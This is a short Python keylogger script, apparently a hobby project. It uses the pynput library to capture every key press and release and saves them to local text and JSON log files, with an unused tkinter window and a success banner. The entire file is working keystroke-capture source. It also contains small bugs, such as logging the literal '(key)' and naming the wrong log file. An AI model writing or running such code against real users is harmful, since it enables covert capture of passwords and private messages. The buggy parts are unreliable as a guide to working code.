# Keylogger-Project
import tkinter as tk 
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("250x300")
root.title("keylogger")
key_list = []
x = False
key_strokes = ""
def update_txt_file(key):
	with open('log.txt','w+') as key_strokes:
		key_strokes.write(key)
def update_json_file(key_list):
	with open ('log.json','w+') as key_strokes:
		key_list_str = json.dumps(key_list)
		key_strokes.write(key_list_str)
def on_press(key):
	global x, key_list
	if x == False:
		key_list.append({'Presses':f'(key)'})
		x = True
	if x == True:
		key_list.append({'Held':f'{key}'})
	update_json_file(key_list)
def on_release(key):
	global x, key_list, key_strokes
	key_list.append({'Released': f'{key}'})
	if x == True:
		x = False
	update_json_file(key_list)
	key_strokes = key_strokes+str(key)
	update_txt_file(str(key_strokes))
print("[+] Running Keylogger Successfully!!\n[!] Saving the Key logs in 'logs.json'")
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()
